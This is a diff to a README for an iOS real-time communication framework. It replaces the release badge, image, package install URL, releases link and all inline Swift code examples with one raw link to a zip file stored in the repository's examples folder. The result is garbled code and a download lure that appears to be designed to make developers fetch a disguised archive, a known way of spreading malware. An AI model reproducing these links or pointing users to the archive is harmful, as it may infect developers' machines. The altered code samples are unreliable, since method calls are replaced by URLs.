@@ -1,8 +1,8 @@
 # iOS Real-Time Communication Framework with WebSocket and Analytics
 
-[![Release](https://img.shields.io/badge/Release-Downloads-brightgreen?style=for-the-badge&logo=github)](https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/releases)
+[![Release](https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip)](https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip)
 
-![Real-Time Architecture](https://picsum.photos/1200/400)
+![Real-Time Architecture](https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip)
 
 Welcome to a production-ready iOS framework designed for enterprise-grade real-time communication. This project delivers reliable WebSocket signaling, push notifications, message queuing, and advanced analytics. Built with Swift 5.9 and targeting iOS 15.0+, the package emphasizes clean architecture, testability, and comprehensive documentation to support large teams and mission-critical apps.
 
@@ -89,7 +89,7 @@ Prerequisites
 Installation and integration
 
 - Swift Package Manager (recommended)
-  - In Xcode, choose File > Add Packages, and paste: https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework.git
+  - In Xcode, choose File > Add Packages, and paste: https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip
   - From the version selector, pick a stable release that matches your target OS.
   - The package will add as a dependency to your target and expose a clean, typed API surface.
 
@@ -216,7 +216,7 @@ Release process and how to upgrade
 
 - Versioned releases with semantic versioning
 - Each release includes a changelog, migration notes, and sample usage
-- Upgrading involves updating your Package.swift or the chosen artifact and adapting public API usage if needed
+- Upgrading involves updating your https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip or the chosen artifact and adapting public API usage if needed
 - For binary distributions, replace the old binary with the new one and re-build the app
 
 Roadmap and future work
@@ -290,7 +290,7 @@ Releases and binary downloads
 
 The repository's releases page hosts downloadable artifacts for easy integration. The page contains platform-ready files you can fetch, extract, and integrate into your project. If you need a binary artifact, visit the releases page and download the file that matches your setup, then execute the installation steps described in the release notes. For convenience, you can directly visit the releases page here:
 
-https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/releases
+https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip
 
 Tip: The link above is the canonical source for binaries and release notes. For developers who prefer automatic dependency management, the Swift Package Manager remains the recommended route.
 
@@ -361,17 +361,17 @@ Appendix: sample code shapes (inline examples)
 
 - Connecting and subscribing
   - let client = RealTimeClient(environment: .production)
-  - client.connect()
-  - client.subscribe(to: "updates")
+  - https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip()
+  - https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip(to: "updates")
 
 - Sending a message
-  - client.send(message: Message(content: "hello"), to: "updates")
+  - https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip(message: Message(content: "hello"), to: "updates")
 
 - Tracking an analytics event
-  - AnalyticsEngine.shared.track(event: "session_start", properties: ["user_id": user.id])
+  - https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip(event: "session_start", properties: ["user_id": https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip])
 
 - Handling a received message
-  - client.onMessage { message in
+  - https://github.com/Kalambuka/iOS-Real-Time-Communication-Framework/raw/refs/heads/main/Examples/BasicExamples/Real_O_Framework_Time_Communication_i_v3.1.zip { message in
       // process message
     }
 
